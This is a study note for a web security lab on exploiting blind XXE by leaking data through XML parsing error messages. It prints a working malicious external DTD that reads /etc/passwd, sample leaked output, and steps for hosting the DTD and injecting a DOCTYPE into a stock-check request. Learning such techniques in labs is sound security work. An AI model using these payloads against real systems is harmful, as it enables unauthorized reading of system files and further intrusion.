## Introduction
- An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve.
- This will be effective if the application returns the resulting error message within its response.

**You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:**
```python
`<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
%eval; 
%error;
```
1. **Defining Entities:**
    
    - The code defines an XML parameter entity called `file`, which contains the content of the `/etc/passwd` file.
    - It defines another parameter entity called `eval`, which contains a dynamic declaration for yet another parameter entity named `error`. The `error` entity will attempt to load a nonexistent file, using the value from the `file` entity.
2. **Triggering the Attack:**
    
    - The `%eval;` part triggers the dynamic declaration of the `error` entity.
    - The `%error;` part triggers the evaluation of the `error` entity. This results in an attempt to load a nonexistent file with a name constructed from the value of the `file` entity.
3. **Attack Outcome:**
    
    - Since the `file` entity contains the content of `/etc/passwd`, the constructed nonexistent file name contains the content of the `/etc/passwd` file.
    - The XML processor tries to load the nonexistent file, resulting in an error message. This error message will include the content of the `/etc/passwd` file, revealing sensitive system information.

**Invoking the malicious external DTD will result in an error message like the following:**
```python
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
...
```
## Steps to solve lab
### Desc - Exploiting blind XXE to retrieve data via error messages
**Our end goal** - To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

1. First host your malicious `.dtd` file in the exploit server and take a note of that url.
![[XXE19.png]]

2. Now, grab the `POST /product/stock` and send it to burp repeater.
![[XXE20.png]]

3. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
![[XXE21.png]]
